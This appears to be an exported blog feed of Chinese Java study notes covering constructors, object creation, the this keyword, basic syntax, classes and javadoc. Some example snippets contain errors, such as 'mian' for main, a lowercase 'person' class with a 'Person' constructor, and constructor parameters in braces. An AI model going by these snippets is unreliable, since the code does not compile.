<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Constructor</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mian</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="comment">//当我们new 一个对象时，直接通过构造器指定名字和年龄</span></span><br><span class="line">		<span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Smith&quot;</span>,<span class="number">80</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">	String name;</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	<span class="comment">//构造器</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String pName,<span class="type">int</span> pAge)</span>&#123;</span><br><span class="line">		name = pName;</span><br><span class="line">		age = pAge;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="构造器细节"><a href="#构造器细节" class="headerlink" title="构造器细节"></a>构造器细节</h3><ul>
<li>一个类可以定义多个不同的构造器，即构造器重载</li>
<li>构造器名和类名要相同（不同的话就会被视为方法）</li>
<li>构造器没有返回值（方法有）</li>
<li>构造器是完成对象的初始化，并不是创建对象（初始化之前，对象已经存在了）</li>
<li>在创建对象时，系统自动的调用该类的构造方法</li>
<li>如果程序员没有定义构造器，系统会自动给类生成一个默认无参构造（也叫默认构造器），比如Person(){}，使用<strong>javap指令反编译</strong>可以看到。</li>
<li>一旦定义了自己的构造器，默认的构造器就被覆盖了，不能再使用默认的无参构造器，除非显式定义，即Person(){}</li>
</ul>
<h1 id="十、对象创建的流程分析"><a href="#十、对象创建的流程分析" class="headerlink" title="十、对象创建的流程分析"></a>十、对象创建的流程分析</h1><ul>
<li>案例流程分析（经典面试题）：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">	<span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">90</span>;</span><br><span class="line">	String name;</span><br><span class="line">	Person(String n ,<span class="type">int</span> a)&#123;</span><br><span class="line">		name = n;<span class="comment">//给属性赋值</span></span><br><span class="line">		age = a;<span class="comment">//..</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;云韵&quot;</span>,<span class="number">20</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/image-20220418143940251.png" alt="image-20220418143940251"></p>
<ul>
<li>1、加载Person类信息（Person.class），只会加载一次</li>
<li>2、在堆中分配空间（地址）</li>
<li>3、完成对象初始化<ul>
<li>3.1、默认初始化：age&#x3D;0 ，name&#x3D;null</li>
<li>3.2、显式初始化：age&#x3D;90，name&#x3D;null</li>
<li>3.3、构造器的初始化：age&#x3D;20，name&#x3D;云韵（这个字符串在常量池）</li>
</ul>
</li>
<li>4、把对象在堆中的地址，返回给p（p是对象名，也可以理解成是对象的引用）</li>
</ul>
<h1 id="十一、this关键字"><a href="#十一、this关键字" class="headerlink" title="十一、this关键字"></a>十一、this关键字</h1><h3 id="什么是this"><a href="#什么是this" class="headerlink" title="什么是this"></a>什么是this</h3><p>java虚拟机会给每个对象分配this，代表当前对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> String name;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">	<span class="keyword">public</span> Dog&#123;String name, <span class="type">int</span> in_age&#125;&#123;</span><br><span class="line">		<span class="built_in">this</span>.name = name;</span><br><span class="line">		<span class="built_in">this</span>.age = in_age;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">info</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="built_in">this</span>.name+<span class="string">&quot;\t&quot;</span>+<span class="built_in">this</span>.hashCode());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//java中可以使用hashCode获取对象的地址，但不是真正的地址（因为java是运行在jvm虚拟机里面的），只是可以视为一个地址）</span></span><br><span class="line"><span class="comment">//使用hashCode()方法</span></span><br></pre></td></tr></table></figure>

<p>总结：哪个对象调用，this就代表哪个对象</p>
<h3 id="this使用细节"><a href="#this使用细节" class="headerlink" title="this使用细节"></a>this使用细节</h3><ul>
<li>1、this关键字可以用来访问本类的属性、方法、构造器</li>
<li>2、this用于区分当前类的属性和局部变量</li>
<li>3、访问成员方法的语法：this.方法名（参数列表）</li>
<li>4、访问构造器语法：this（参数列表），<strong>注意只能在构造器中使用</strong></li>
<li>5、this不能再类定义的外部使用，只能在类定义的方法中使用</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(一)——基本特性</title>
    <url>/2022/02/19/07-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Java语言相关基础知识的学习，主要参考<a href="https://www.runoob.com/java/java-tutorial.html">菜鸟教程</a>上的相关知识。</p>
<h1 id="（一）主要特性"><a href="#（一）主要特性" class="headerlink" title="（一）主要特性"></a>（一）主要特性</h1><p>相较于之前接触过的C、C++的一些独特特性有：</p>
<h2 id="1、简单"><a href="#1、简单" class="headerlink" title="1、简单"></a>1、简单</h2><p>Java语言的语法和C、C++接近，容易理解。另外，其丢弃了C++中很少使用、较难理解的一些特性：操作符重载、多继承、自动强制类型转换。特别的是：<strong>Java不使用指针，而是引用</strong>。并提供自动分配和回收的内存空间。</p>
<h2 id="2、面向对象"><a href="#2、面向对象" class="headerlink" title="2、面向对象"></a>2、面向对象</h2><p>Java提供<strong>类、接口和继承</strong>等面向对象的特性。为了简单起见，只支持<strong>类之间的单继承</strong>，但支持<strong>接口之间的多继承</strong>，并支持<strong>类与接口之间的实现机制</strong>（关键字为 implements）。Java 语言<strong>全面支持动态绑定</strong>，而 C++语言只对虚函数使用动态绑定。</p>
<h2 id="3、分布式"><a href="#3、分布式" class="headerlink" title="3、分布式"></a>3、分布式</h2><p>Java支持 Internet 应用的开发，在基本的 Java 应用编程接口中有一个<strong>网络应用编程接口</strong>（java net），它提供了用于网络应用编程的类库，包括 URL、URLConnection、Socket、ServerSocket 等。Java 的 RMI（远程方法激活）机制也是开发分布式应用的重要手段。</p>
<span id="more"></span>

<h2 id="4、强势"><a href="#4、强势" class="headerlink" title="4、强势"></a>4、强势</h2><p>Java 具有强类型机制、异常处理、垃圾的自动收集等特性，对指针的丢弃是 Java 的明智选择，同时其具有安全检查机制。</p>
<h2 id="5、安全"><a href="#5、安全" class="headerlink" title="5、安全"></a>5、安全</h2><p>Java 提供了一个<strong>安全机制以防恶意代码的攻击</strong>。除了Java 语言具有的许多安全特性以外，Java 对通过网络下载的类具有一个安全防范机制（类 ClassLoader），如分配不同的名字空间以防替代本地的同名类、字节代码检查，并提供安全管理机制（类 SecurityManager）让 Java 应用设置安全哨兵。</p>
<h2 id="6、中立性"><a href="#6、中立性" class="headerlink" title="6、中立性"></a>6、中立性</h2><p>Java 程序（后缀为 java 的文件）在 Java 平台上被编译为体系结构中立的字节码格式（后缀为 class 的文件），然后可以在实现这个 Java 平台的<strong>任何系统</strong>中运行。这种途径适合于异构的网络环境和软件的分发。</p>
<h2 id="7、可移植性"><a href="#7、可移植性" class="headerlink" title="7、可移植性"></a>7、可移植性</h2><p>这种可移植性来源于体系结构中立性，另外，Java 还严格规定了各个基本数据类型的长度。Java 系统本身也具有很强的可移植性，Java 编译器是用 Java 实现的，Java 的运行环境是用 ANSI C 实现的</p>
<h2 id="8、解释性"><a href="#8、解释性" class="headerlink" title="8、解释性"></a>8、解释性</h2><p>解释性语言主要有：Javascript、PHP、java</p>
<p>编译性语言：C&#x2F;C++</p>
<p>区别是：解释性语言，编译后的代码，不能直接被机器执行，需要<strong>解释器</strong>来执行，编译性语言编译后的代码可以直接执行。</p>
<p>Java 程序在 Java 平台上被编译为字节码格式，然后可以在实现这个 Java 平台的任何系统中运行。在运行时，Java 平台中的 Java 解释器对这些字节码进行解释执行，执行过程中需要的类在联接阶段被载入到运行环境中。</p>
<h2 id="9、高性能"><a href="#9、高性能" class="headerlink" title="9、高性能"></a>9、高性能</h2><p>与那些解释型的高级脚本语言相比，Java 的确是高性能的。事实上，Java 的运行速度随着 JIT(Just-In-Time）编译器技术的发展越来越接近于 C++。</p>
<h2 id="10、多线程"><a href="#10、多线程" class="headerlink" title="10、多线程"></a>10、多线程</h2><p>在 Java 语言中，线程是一种特殊的对象，它必须由 <strong>Thread 类</strong>或其子（孙）类来创建。通常有两种方法来创建线程：其一，使用型构为 Thread(Runnable) 的构造子类将一个实现了 Runnable 接口的对象包装成一个线程，其二，从 Thread 类派生出子类并重写 run 方法，使用该子类创建的对象即为线程。值得注意的是 Thread 类已经实现了 Runnable 接口，因此，任何一个线程均有它的 run 方法，而 run 方法中包含了线程所要运行的代码。线程的活动由一组方法来控制。Java 语言支持多个线程的同时执行，并提供多线程之间的同步机制（关键字为 synchronized）。</p>
<h2 id="11、动态"><a href="#11、动态" class="headerlink" title="11、动态"></a>11、动态</h2><p>Java 程序需要的类能够动态地被载入到运行环境，也可以通过网络来载入所需要的类。这也有利于软件的升级。另外，Java 中的类有一个运行时刻的表示，能进行运行时刻的类型检查。</p>
<h1 id="（二）Java运行机制及运行过程"><a href="#（二）Java运行机制及运行过程" class="headerlink" title="（二）Java运行机制及运行过程"></a>（二）Java运行机制及运行过程</h1><p>class后缀文件之所以拥有跨平台性，在多个系统上都可以运行。是因为JVM（java虚拟机）</p>
<ul>
<li>JVM是一个虚拟的计算机，具有指令集并使用不同的存储区域，负责执行指令、管理数据、内存、寄存器，包含在JDK中。</li>
<li>对于不同的平台，有不同的虚拟机</li>
<li>java虚拟机机制屏蔽了底层运行平台的差别，实现了跨平台性。</li>
</ul>
<h1 id="（三）JDK、JRE"><a href="#（三）JDK、JRE" class="headerlink" title="（三）JDK、JRE"></a>（三）JDK、JRE</h1><p>JDK：Java Development Kit（Java开发工具包）&#x3D;JRE+Java的开发工具【java、javac、javadoc、Javap等】</p>
<p>JRE：Java Runtime Environment（Java运行环境）&#x3D;JVM+Java SE标准类库（java核心类库）</p>
<h1 id="（四）Java基础语法"><a href="#（四）Java基础语法" class="headerlink" title="（四）Java基础语法"></a>（四）Java基础语法</h1><p>下面简要介绍下类、对象、方法和实例变量的概念：</p>
<ul>
<li><strong>对象</strong>：对象是类的一个实例，有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。</li>
<li><strong>类</strong>：类是一个模板，它描述一类对象的行为和状态。</li>
<li><strong>方法</strong>：方法就是行为，一个类可以有很多方法。逻辑运算、数据修改以及所有动作都是在方法中完成的。</li>
<li><strong>实例变量</strong>：每个对象都有独特的实例变量，对象的状态由这些实例变量的值决定。</li>
</ul>
<h2 id="1、一个简单的Java程序"><a href="#1、一个简单的Java程序" class="headerlink" title="1、一个简单的Java程序"></a>1、一个简单的Java程序</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Cloudyunn/img/master/note/662E827A-FA32-4464-B0BD-40087F429E98.jpg" alt="img"></p>
<p>在文件有中文的时候，可以设置编码为GBK即可显示。</p>
<h2 id="2、基本语法"><a href="#2、基本语法" class="headerlink" title="2、基本语法"></a>2、基本语法</h2><p>一些需要注意的语法</p>
<ul>
<li><strong>大小写敏感</strong></li>
<li><strong>类名</strong>：对于所有的类来说，类名的首字母应该大写。</li>
<li><strong>方法名</strong>：所有的方法名都应该以小写字母开头。</li>
<li><strong>源文件名</strong>：源文件名必须和类名相同。如果不同则会导致编译错误。</li>
<li><strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li>
</ul>
<h2 id="3、Java修饰符"><a href="#3、Java修饰符" class="headerlink" title="3、Java修饰符"></a>3、Java修饰符</h2><p>Java可以使用修饰符来修饰类中方法和属性。主要有两类修饰符：</p>
<ul>
<li>访问控制修饰符 : default, public , protected, private</li>
<li>非访问控制修饰符 : final, abstract, static, synchronized</li>
</ul>
<h2 id="4、Java变量"><a href="#4、Java变量" class="headerlink" title="4、Java变量"></a>4、Java变量</h2><p>Java 中主要有如下几种类型的变量</p>
<ul>
<li>局部变量</li>
<li>类变量（静态变量）</li>
<li>成员变量（非静态变量）</li>
</ul>
<h2 id="5、继承"><a href="#5、继承" class="headerlink" title="5、继承"></a>5、继承</h2><p>在 Java 中，一个类可以由其他类派生。如果你要创建一个类，而且已经存在一个类具有你所需要的属性或方法，那么你可以将新创建的类继承该类。</p>
<p>利用继承的方法，可以重用已存在类的方法和属性，而不用重写这些代码。被继承的类称为超类（super class），派生类称为子类（sub class）。</p>
<h2 id="6、接口"><a href="#6、接口" class="headerlink" title="6、接口"></a>6、接口</h2><p>在 Java 中，接口可理解为对象间相互通信的协议。接口在继承中扮演着很重要的角色。</p>
<p>接口只定义派生要用到的方法，但是方法的具体实现完全取决于派生类。</p>
<h2 id="7、Java-源程序与编译型运行区别"><a href="#7、Java-源程序与编译型运行区别" class="headerlink" title="7、Java 源程序与编译型运行区别"></a>7、Java 源程序与编译型运行区别</h2><p><img src="https://github.com/Cloudyunn/img/master/note/ZSSDMld.png" alt="img"></p>
<h1 id="（五）Java对象和类"><a href="#（五）Java对象和类" class="headerlink" title="（五）Java对象和类"></a>（五）Java对象和类</h1><p>Java作为一种面向对象语言。支持以下基本概念：</p>
<ul>
<li>多态</li>
<li>继承</li>
<li>封装</li>
<li>抽象</li>
<li>类</li>
<li>对象</li>
<li>实例</li>
<li>方法</li>
<li>重载</li>
</ul>
<p><img src="https://github.com/Cloudyunn/img/master/note/20210105-java-object-1.png" alt="img"></p>
<p>通过上图创建一个简单的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line">    String breed;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    String colour;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//方法</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">name</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个类可以包含以下类型变量：</p>
<ul>
<li><strong>局部变量</strong>：在方法、构造方法或者语句块中定义的变量被称为局部变量。变量声明和初始化都是在方法中，方法结束后，变量就会自动销毁。</li>
<li><strong>成员变量</strong>：成员变量是定义在类中，方法体之外的变量。这种变量在创建对象的时候实例化。成员变量可以被类中方法、构造方法和特定类的语句块访问。</li>
<li><strong>类变量</strong>：类变量也声明在类中，方法体之外，但必须声明为 static 类型。</li>
</ul>
<p>一个类可以拥有多个方法，在上面的例子中：eat()、run()、sleep() 和 name() 都是 Dog 类的方法。</p>
<h2 id="1、构造方法"><a href="#1、构造方法" class="headerlink" title="1、构造方法"></a>1、构造方法</h2><p>每个类都有构造方法。如果没有显式地为类定义构造方法，Java 编译器将会为该类提供一个<strong>默认构造方法</strong>。</p>
<p>在创建一个对象的时候，至少要调用一个构造方法。构造方法的名称<strong>必须与类同名</strong>，一个类可以有多个构造方法。</p>
<p>下面是一个构造方法示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(String name)</span>&#123;</span><br><span class="line">	<span class="comment">//这个构造器只有一个参数：name</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2、创建对象"><a href="#2、创建对象" class="headerlink" title="2、创建对象"></a>2、创建对象</h2><p>对象是根据类创建的。在Java中，使用关键字 new 来创建一个新的对象。创建对象需要以下三步：</p>
<ul>
<li><strong>声明</strong>：声明一个对象，包括对象名称和对象类型。</li>
<li><strong>实例化</strong>：使用关键字 new 来创建一个对象。</li>
<li><strong>初始化</strong>：使用 new 创建对象时，会调用构造方法初始化对象。</li>
</ul>
<p>下面是一个创建对象的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="comment">//这个构造器仅有一个参数：name</span></span><br><span class="line">        System.out.println(<span class="string">&quot;小狗的名字是：&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//下面语句将创建一个Test对象</span></span><br><span class="line">        <span class="type">Test</span> <span class="variable">myTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="string">&quot;tommy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3、访问实例变量和方法"><a href="#3、访问实例变量和方法" class="headerlink" title="3、访问实例变量和方法"></a>3、访问实例变量和方法</h2><p>通过已创建的对象来访问成员变量和成员方法，如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 实例化对象 */</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">referenceVariable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Constructor</span>();</span><br><span class="line"><span class="comment">/* 访问类中的变量 */</span></span><br><span class="line">referenceVariable.variableName;</span><br><span class="line"><span class="comment">/* 访问类中的方法 */</span></span><br><span class="line">referenceVariable.methodName();</span><br></pre></td></tr></table></figure>

<p>具体实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Puppy</span> &#123;</span><br><span class="line">    <span class="type">int</span> puppyAge;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Puppy</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小狗的名字是:&quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        puppyAge = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小狗的年龄是:&quot;</span> + puppyAge);</span><br><span class="line">        <span class="comment">//return puppyAge;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Puppy</span> <span class="variable">myPuppy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Puppy</span>(<span class="string">&quot;tom&quot;</span>);</span><br><span class="line">        myPuppy.setAge(<span class="number">5</span>);</span><br><span class="line">        myPuppy.getAge();</span><br><span class="line">        System.out.println(<span class="string">&quot;小狗的年龄是:&quot;</span> + myPuppy.puppyAge);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*结果：</span></span><br><span class="line"><span class="comment">小狗的名字是:tom</span></span><br><span class="line"><span class="comment">小狗的年龄是:5</span></span><br><span class="line"><span class="comment">小狗的年龄是:5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="4、源文件声明规则"><a href="#4、源文件声明规则" class="headerlink" title="4、源文件声明规则"></a>4、源文件声明规则</h2><p>当在一个源文件中定义多个类，并且还有import语句和package语句时，要特别注意这些规则。</p>
<ul>
<li>一个源文件中只能有一个 public 类</li>
<li>一个源文件可以有多个非 public 类</li>
<li>源文件的名称应该和 public 类的类名保持一致。例如：源文件中 public 类的类名是 Employee，那么源文件应该命名为Employee.java。</li>
<li>如果一个类定义在某个包中，那么 package 语句应该在源文件的首行。</li>
<li>如果源文件包含 import 语句，那么应该放在 package 语句和类定义之间。如果没有 package 语句，那么 import 语句应该在源文件中最前面。</li>
<li>import 语句和 package 语句对源文件中定义的所有类都有效。在同一源文件中，不能给不同的类不同的包声明。</li>
</ul>
<p>类有若干种访问级别，并且类也分不同的类型：抽象类和 final 类等。这些将在访问控制章节介绍。</p>
<p>除了上面提到的几种类型，Java 还有一些特殊的类，如：<a href="https://www.runoob.com/java/java-inner-class.html">内部类</a>、<a href="https://www.runoob.com/java/java-anonymous-class.html">匿名类</a>。</p>
<h2 id="5、Java-包"><a href="#5、Java-包" class="headerlink" title="5、Java 包"></a>5、Java 包</h2><p>包主要用来对类和接口进行分类。当开发 Java 程序时，可能编写成百上千的类，因此很有必要对类和接口进行分类。</p>
<h2 id="6、import-语句"><a href="#6、import-语句" class="headerlink" title="6、import 语句"></a>6、import 语句</h2><p>在 Java 中，如果给出一个完整的限定名，包括包名、类名，那么 Java 编译器就可以很容易地定位到源代码或者类。import 语句就是用来提供一个合理的路径，使得编译器可以找到某个类。</p>
<p>例如，下面的命令行将会命令编译器载入 java_installation&#x2F;java&#x2F;io 路径下的所有类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br></pre></td></tr></table></figure>

<h3 id="7、一个简单的例子"><a href="#7、一个简单的例子" class="headerlink" title="7、一个简单的例子"></a>7、一个简单的例子</h3><p>在该例子中，我们创建两个类：<strong>Employee</strong> 和 <strong>EmployeeTest</strong>。</p>
<p>首先打开文本编辑器，把下面的代码粘贴进去。注意将文件保存为 Employee.java。</p>
<p>Employee 类有四个成员变量：name、age、designation 和 salary。该类显式声明了一个构造方法，该方法只有一个参数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span>&#123;</span><br><span class="line">   String name;</span><br><span class="line">   <span class="type">int</span> age;</span><br><span class="line">   String designation;</span><br><span class="line">   <span class="type">double</span> salary;</span><br><span class="line">   <span class="comment">// Employee 类的构造器</span></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(String name)</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 设置age的值</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">empAge</span><span class="params">(<span class="type">int</span> empAge)</span>&#123;</span><br><span class="line">      age =  empAge;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/* 设置designation的值*/</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">empDesignation</span><span class="params">(String empDesig)</span>&#123;</span><br><span class="line">      designation = empDesig;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/* 设置salary的值*/</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">empSalary</span><span class="params">(<span class="type">double</span> empSalary)</span>&#123;</span><br><span class="line">      salary = empSalary;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/* 打印信息 */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printEmployee</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;名字:&quot;</span>+ name );</span><br><span class="line">      System.out.println(<span class="string">&quot;年龄:&quot;</span> + age );</span><br><span class="line">      System.out.println(<span class="string">&quot;职位:&quot;</span> + designation );</span><br><span class="line">      System.out.println(<span class="string">&quot;薪水:&quot;</span> + salary);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序都是从main方法开始执行。为了能运行这个程序，必须包含main方法并且创建一个实例对象。</p>
<p>下面给出EmployeeTest类，该类实例化2个 Employee 类的实例，并调用方法设置变量的值。</p>
<p>将下面的代码保存在 EmployeeTest.java文件中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmployeeTest</span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">      <span class="comment">/* 使用构造器创建两个对象 */</span></span><br><span class="line">      <span class="type">Employee</span> <span class="variable">empOne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;RUNOOB1&quot;</span>);</span><br><span class="line">      <span class="type">Employee</span> <span class="variable">empTwo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;RUNOOB2&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 调用这两个对象的成员方法</span></span><br><span class="line">      empOne.empAge(<span class="number">26</span>);</span><br><span class="line">      empOne.empDesignation(<span class="string">&quot;高级程序员&quot;</span>);</span><br><span class="line">      empOne.empSalary(<span class="number">1000</span>);</span><br><span class="line">      empOne.printEmployee();</span><br><span class="line"> </span><br><span class="line">      empTwo.empAge(<span class="number">21</span>);</span><br><span class="line">      empTwo.empDesignation(<span class="string">&quot;菜鸟程序员&quot;</span>);</span><br><span class="line">      empTwo.empSalary(<span class="number">500</span>);</span><br><span class="line">      empTwo.printEmployee();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译这两个文件并且运行 EmployeeTest 类，可以看到如下结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ javac EmployeeTest.java</span><br><span class="line">$ java EmployeeTest </span><br><span class="line">名字:RUNOOB1</span><br><span class="line">年龄:26</span><br><span class="line">职位:高级程序员</span><br><span class="line">薪水:1000.0</span><br><span class="line">名字:RUNOOB2</span><br><span class="line">年龄:21</span><br><span class="line">职位:菜鸟程序员</span><br><span class="line">薪水:500.0</span><br></pre></td></tr></table></figure>

<h1 id="（六）Java文档注释"><a href="#（六）Java文档注释" class="headerlink" title="（六）Java文档注释"></a>（六）Java文档注释</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	*<span class="doctag">@author</span> Cloudyun</span></span><br><span class="line"><span class="comment">	*<span class="doctag">@version</span> 1.0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>上面例子即为Java的文档注释，注释内容可以被JDK提供的工具javadoc所解析，生成一套以网页文件形式体现的该程序的说明文档，一般写在类</p>
<p>如何应用生成？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javadoc -d 文件夹名 -author -version -... Test.java</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode——数组</title>
    <url>/2022/03/28/10-leetcode%E2%80%94%E2%80%94%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本部分记录，leetcode上面关于数组、二分查找等部分题目的思路，动态更新。</p>
